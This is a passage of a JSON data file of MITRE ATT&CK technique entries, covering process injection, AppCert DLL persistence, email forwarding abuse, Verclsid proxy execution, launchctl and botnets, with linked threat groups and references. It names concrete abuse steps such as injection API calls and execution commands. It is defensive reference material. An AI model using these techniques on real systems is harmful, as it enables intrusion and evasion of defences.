`nvram`).^[[2]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^","platforms":["Linux","macOS","Windows","Network"],"tactics":["Discovery"],"campaigns":["C0015","Operation Honeybee","Operation CuckooBees","SolarWinds Compromise","Operation Wocao","Operation Dream Job","Night Dragon"],"groups":["Patchwork","Sowbug","Gamaredon Group","Dragonfly","APT38","APT28","Inception","Chimera","admin@338","Ke3chang","Sandworm Team","Sidewinder","Aoqin Dragon","Tropic Trooper","Dark Caracal","MuddyWater","Magic Hound","TeamTNT","LuminousMoth","APT3","APT32","Mustang Panda","APT39","Lazarus Group","Darkhotel","menuPass","Kimsuky","HAFNIUM","Confucius","APT41","Winnti Group","Windigo","APT18","Fox Kitten","Leafminer","FIN13","Turla","BRONZE BUTLER","UNC2452","APT29","Operation Wocao","Honeybee","Dust Storm","Dragonfly 2.0"]},"T1568":{"id":"T1568","name":"Dynamic Resolution","description":"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.^[[1]](http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html)^^[[2]](https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html)^^[[3]](https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/)^","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["Operation Spalax","SolarWinds Compromise","C0026","Operation Dust Storm","Night Dragon"],"groups":["TA2541","Transparent Tribe","BITTER","APT29","Gamaredon Group","UNC2452","Gelsemium"]},"T1036.004":{"id":"T1036.004","name":"Masquerade Task or Service","description":"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.^[[1]](https://technet.microsoft.com/en-us/library/bb490996.aspx)^^[[2]](https://www.freedesktop.org/software/systemd/man/systemd.service.html)^ Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.^[[3]](http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/)^^[[4]](https://vms.drweb.com/virus/?i=4276269)^","platforms":["Windows","Linux","macOS"],"tactics":["Defense Evasion"],"campaigns":["C0017","Frankenstein","SolarWinds Compromise"],"groups":["Kimsuky","Carbanak","FIN7","FIN13","APT-C-36","APT32","Wizard Spider","BITTER","FIN6","Naikon","Fox Kitten","PROMETHIUM","ZIRCONIUM","Magic Hound","Higaisa","Lazarus Group","BackdoorDiplomacy","APT41","APT29","UNC2452"]},"T1055.004":{"id":"T1055.004","name":"Asynchronous Procedure Call","description":"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue ^[[1]](https://msdn.microsoft.com/library/windows/desktop/ms681951.aspx)^ of a process's thread. Queued APC functions are executed when the thread enters an alterable state.^[[1]](https://msdn.microsoft.com/library/windows/desktop/ms681951.aspx)^ A handle to an existing victim process is first created with native Windows API calls such as `OpenThread`. At this point `QueueUserAPC` can be used to invoke a function (such as `LoadLibrayA` pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. ^[[2]](https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/)^ AtomBombing ^[[3]](https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows)^ is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.^[[4]](https://msdn.microsoft.com/library/windows/desktop/ms649053.aspx)^\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":["FIN8"]},"T1020.001":{"id":"T1020.001","name":"Traffic Duplication","description":"Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. ^[[1]](https://www.cisco.com/c/en/us/td/docs/routers/crs/software/crs_r5-1/interfaces/configuration/guide/hc51xcrsbook/hc51span.html)^^[[2]](https://www.juniper.net/documentation/en_US/junos/topics/concept/port-mirroring-ex-series.html)^\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).^[[3]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^^[[4]](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)^\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.^[[5]](https://docs.aws.amazon.com/vpc/latest/mirroring/traffic-mirroring-how-it-works.html)^^[[6]](https://cloud.google.com/vpc/docs/packet-mirroring)^^[[7]](https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-tap-overview)^\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.","platforms":["Network","IaaS"],"tactics":["Exfiltration"],"campaigns":[],"groups":[]},"T1647":{"id":"T1647","name":"Plist File Modification","description":"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the `info.plist` file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.^[[1]](https://fileinfo.com/extension/plist)^ \n\nAdversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).\n\nFor example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the `LSUIElement` key in an application’s `info.plist` file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as `LSEnvironment`, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).^[[2]](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)^^[[3]](https://www.welivesecurity.com/wp-content/uploads/200x/white-papers/osx_flashback.pdf)^","platforms":["macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1546.009":{"id":"T1546.009","name":"AppCert DLLs","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the `AppCertDLLs` Registry key under `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\` are loaded into every process that calls the ubiquitously used application programming interface (API) functions `CreateProcess`, `CreateProcessAsUser`, `CreateProcessWithLoginW`, `CreateProcessWithTokenW`, or `WinExec`. ^[[1]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ","platforms":["Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":["Honeybee"]},"T1114.003":{"id":"T1114.003","name":"Email Forwarding Rule","description":"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.^[[1]](https://www.us-cert.gov/ncas/alerts/TA18-086A)^ Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.^[[2]](https://blog.compass-security.com/2018/09/hidden-inbox-rules-in-microsoft-exchange/)^ Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.^[[3]](https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/)^^[[4]](https://support.apple.com/guide/mail/reply-to-forward-or-redirect-emails-mlhlp1010/mac)^\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.^[[2]](https://blog.compass-security.com/2018/09/hidden-inbox-rules-in-microsoft-exchange/)^\n\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.^[[5]](https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/mail-flow-rules)^ Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. ","platforms":["Office 365","Windows","Google Workspace","macOS","Linux"],"tactics":["Collection"],"campaigns":[],"groups":["Silent Librarian","LAPSUS$","Kimsuky"]},"T1074":{"id":"T1074","name":"Data Staged","description":"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.^[[1]](https://web.archive.org/web/20220224041316/https:/www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)^\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.^[[2]](https://content.fireeye.com/m-trends/rpt-m-trends-2020)^\n\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.","platforms":["Windows","IaaS","Linux","macOS"],"tactics":["Collection"],"campaigns":[],"groups":["Wizard Spider","Volt Typhoon"]},"T1649":{"id":"T1649","name":"Steal or Forge Authentication Certificates","description":"Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.^[[1]](https://o365blog.com/post/deviceidentity/)^^[[2]](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831740(v=ws.11))^\n\nAuthentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)^[[3]](https://www.mandiant.com/resources/blog/apt29-windows-credential-roaming)^, misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.^[[4]](https://web.archive.org/web/20220818094600/https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)^^[[5]](https://github.com/TheWover/CertStealer)^^[[6]](https://github.com/GhostPack/SharpDPAPI#certificates)^ With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.^[[7]](https://posts.specterops.io/certified-pre-owned-d95910965cd2)^\n\nAbusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.\n\nAdversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as “golden” certificates).^[[7]](https://posts.specterops.io/certified-pre-owned-d95910965cd2)^ Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.^[[7]](https://posts.specterops.io/certified-pre-owned-d95910965cd2)^","platforms":["Windows","Linux","macOS","Azure AD"],"tactics":["Credential Access"],"campaigns":[],"groups":["APT29"]},"T1098.005":{"id":"T1098.005","name":"Device Registration","description":"Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.^[[1]](https://www.cisa.gov/uscert/ncas/alerts/aa22-074a)^^[[2]](https://www.darkreading.com/threat-intelligence/fireeye-s-mandia-severity-zero-alert-led-to-discovery-of-solarwinds-attack)^ In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. ^[[3]](https://www.mandiant.com/resources/blog/apt29-continues-targeting-microsoft)^\n\nSimilarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.^[[4]](https://o365blog.com/post/devices/)^^[[5]](https://o365blog.com/post/mdm)^^[[6]](https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/)^ \n\nDevices registered in Azure AD may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.^[[7]](https://www.microsoft.com/security/blog/2022/01/26/evolved-phishing-device-registration-trick-adds-to-phishers-toolbox-for-victims-without-mfa)^ Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Azure AD tenant by registering a large number of devices.^[[8]](https://o365blog.com/post/bprt/)^","platforms":["Azure AD","Windows","SaaS"],"tactics":["Persistence","Privilege Escalation"],"campaigns":["SolarWinds Compromise","C0027"],"groups":["APT29"]},"T1049":{"id":"T1049","name":"System Network Connections Discovery","description":"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.^[[1]](https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html)^^[[2]](https://docs.microsoft.com/en-us/azure/virtual-network/virtual-networks-overview)^^[[3]](https://cloud.google.com/vpc/docs/vpc)^ Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and `lsof` can be used to list current connections. `who -a` and `w` can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. `show ip sockets`, `show tcp brief`).^[[4]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^","platforms":["Windows","IaaS","Linux","macOS","Network"],"tactics":["Discovery"],"campaigns":["Operation Wocao","Operation CuckooBees","FunnyDream"],"groups":["APT38","menuPass","Poseidon Group","TeamTNT","Andariel","Mustang Panda","Turla","APT3","Volt Typhoon","Sandworm Team","APT1","OilRig","Magic Hound","Chimera","MuddyWater","admin@338","GALLIUM","APT41","HEXANE","BackdoorDiplomacy","APT32","Earth Lusca","Tropic Trooper","Ke3chang","Lazarus Group","FIN13","Threat Group-3390","Operation Wocao"]},"T1584":{"id":"T1584","name":"Compromise Infrastructure","description":"Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.^[[1]](https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf)^^[[2]](https://www.icann.org/groups/ssac/documents/sac-007-en)^^[[3]](https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html)^^[[4]](https://web.archive.org/web/20151226205946/https://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakens-part-two.html)^ Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.^[[5]](https://www.fireeye.com/blog/threat-research/2019/01/global-dns-hijacking-campaign-dns-record-manipulation-at-scale.html)^ Additionally, adversaries may also compromise infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090) and/or proxyware services.^[[6]](https://www.amnesty.org/en/latest/research/2021/07/forensic-methodology-report-how-to-catch-nso-groups-pegasus/)^^[[7]](https://sysdig.com/blog/proxyjacking-attackers-log4j-exploited/)^\n\nBy using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.^[[8]](https://media.defense.gov/2019/Oct/18/2002197242/-1/-1/0/NSA_CSA_Turla_20191021%20ver%204%20-%20nsa.gov.pdf)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1553.005":{"id":"T1553.005","name":"Mark-of-the-Web Bypass","description":"Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named `Zone.Identifier` with a specific value known as the MOTW.^[[1]](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/6e3f7352-d11c-4d76-8c39-2516a9df36e8)^ Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.^[[2]](https://medium.com/swlh/investigating-the-use-of-vhd-files-by-cybercriminals-3f1f08304316)^^[[3]](https://outflank.nl/blog/2020/03/30/mark-of-the-web-from-a-red-teams-perspective/)^^[[4]](https://www.intezer.com/blog/research/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/)^\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.^[[2]](https://medium.com/swlh/investigating-the-use-of-vhd-files-by-cybercriminals-3f1f08304316)^^[[3]](https://outflank.nl/blog/2020/03/30/mark-of-the-web-from-a-red-teams-perspective/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["TA505","APT29"]},"T1600.002":{"id":"T1600.002","name":"Disable Crypto Hardware","description":"Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). ^[[1]](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)^","platforms":["Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1542":{"id":"T1542","name":"Pre-OS Boot","description":"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.^[[1]](https://en.wikipedia.org/wiki/Booting)^\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.","platforms":["Linux","Windows","Network","macOS"],"tactics":["Defense Evasion","Persistence"],"campaigns":[],"groups":[]},"T1612":{"id":"T1612","name":"Build Image on Host","description":"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote `build` request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.^[[1]](https://docs.docker.com/engine/api/v1.41/#operation/ImageBuild)^\n\nAn adversary may take advantage of that `build` API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.^[[2]](https://blog.aquasec.com/malicious-container-image-docker-container-host)^^[[3]](https://info.aquasec.com/hubfs/Threat%20reports/AquaSecurity_Cloud_Native_Threat_Report_2021.pdf?utm_campaign=WP%20-%20Jun2021%20Nautilus%202021%20Threat%20Research%20Report&utm_medium=email&_hsmi=132931006&_hsenc=p2ANqtz-_8oopT5Uhqab8B7kE0l3iFo1koirxtyfTehxF7N-EdGYrwk30gfiwp5SiNlW3G0TNKZxUcDkYOtwQ9S6nNVNyEO-Dgrw&utm_content=132931006&utm_source=hs_automation)^ If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. ","platforms":["Containers"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1055.002":{"id":"T1055.002","name":"Portable Executable Injection","description":"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as `VirtualAllocEx` and `WriteProcessMemory`, then invoked with `CreateRemoteThread` or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. ^[[1]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^ \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. ","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":["Rocke","Gorgon Group"]},"T1218.012":{"id":"T1218.012","name":"Verclsid","description":"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.^[[1]](https://www.winosbite.com/verclsid-exe/)^\n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running `verclsid.exe /S /C {CLSID}`, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.^[[2]](https://lolbas-project.github.io/lolbas/Binaries/Verclsid/)^^[[3]](https://redcanary.com/blog/verclsid-exe-threat-detection/)^^[[4]](https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/)^^[[5]](https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5)^ ","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1586":{"id":"T1586","name":"Compromise Accounts","description":"Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.^[[1]](https://arstechnica.com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-hbgary-hack/)^^[[2]](https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/)^ Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1569.001":{"id":"T1569.001","name":"Launchctl","description":"Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.^[[1]](https://ss64.com/osx/launchctl.html)^\n\nAdversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: `launchctl load`,`launchctl unload`, and `launchctl start`. Adversaries can use scripts or manually run the commands `launchctl load -w \"%s/Library/LaunchAgents/%s\"` or `/bin/launchctl load` to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.^[[2]](https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/)^^[[3]](https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/)^\n","platforms":["macOS"],"tactics":["Execution"],"campaigns":[],"groups":[]},"T1584.005":{"id":"T1584.005","name":"Botnet","description":"Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.^[[1]](https://us.norton.com/internetsecurity-malware-what-is-a-botnet.html)^ Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.^[[2]](https://www.imperva.com/learn/ddos/booters-stressers-ddosers/)^ Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.^[[3]](https://www.secureworks.com/research/dridex-bugat-v5-botnet-takeover-operation)^ With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["Volt Typhoon","Axiom","Sandworm Team"]},"T1059.008":{"id":"T1059.008","name":"Network Device CLI","description":"Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \n\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).\n\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid 